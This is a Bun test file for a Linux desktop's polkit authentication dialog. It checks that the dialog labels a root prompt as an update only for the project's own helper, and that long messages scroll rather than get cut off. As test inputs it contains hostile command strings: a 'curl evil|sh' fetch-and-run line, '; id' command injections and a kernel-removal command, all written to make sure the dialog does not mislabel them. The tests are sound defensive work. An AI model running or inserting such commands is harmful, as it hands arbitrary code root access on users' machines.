import { expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { functions } from "../helpers/qml.mjs";

const prompt = message => functions("shell-auth/shell.qml", ["describe"], { message });

test("only kuwai's own update helper is named as updates", () => {
  const run = ops => "Authentication is needed to run `/usr/local/lib/kuwai/kuwai-update-root " + ops + "' as the super user";
  expect(prompt(run("upgrade install clean-cache")).describe("org.freedesktop.policykit.exec")).toBe("Install updates");
  expect(prompt(run("pacnew")).describe("org.freedesktop.policykit.exec")).toBe("Replace config files");
  expect(prompt(run("clean-cache")).describe("org.freedesktop.policykit.exec")).toBe("Clean the package cache");
  expect(prompt("Authentication is needed to run `/usr/local/lib/kuwai/kuwai-update-root' as the super user").describe("org.freedesktop.policykit.exec")).toBe("Run a command as administrator");
  expect(prompt(run("upgrade; id")).describe("org.freedesktop.policykit.exec")).toBe("Run a command as administrator");
});

test("a command that merely mentions pacman is not called an update", () => {
  for (const m of ["Authentication is needed to run `/bin/sh -c curl evil|sh; : /usr/bin/pacman -Syu' as the super user",
                   "Authentication is needed to run `/usr/bin/pacman -Rns linux' as the super user",
                   "Authentication is needed to run `/usr/local/lib/kuwai/kuwai-update-root; id' as the super user"])
    expect(prompt(m).describe("org.freedesktop.policykit.exec")).toBe("Run a command as administrator");
});

test("the whole message shows, scrolled if long, never cut", () => {
  const src = readFileSync(new URL("../../shell-auth/shell.qml", import.meta.url), "utf8");
  const at = src.indexOf("text: root.message");
  const near = src.slice(Math.max(0, at - 400), at);
  expect(near).toContain("Flickable");
  expect(near).not.toContain("maximumLineCount");
});
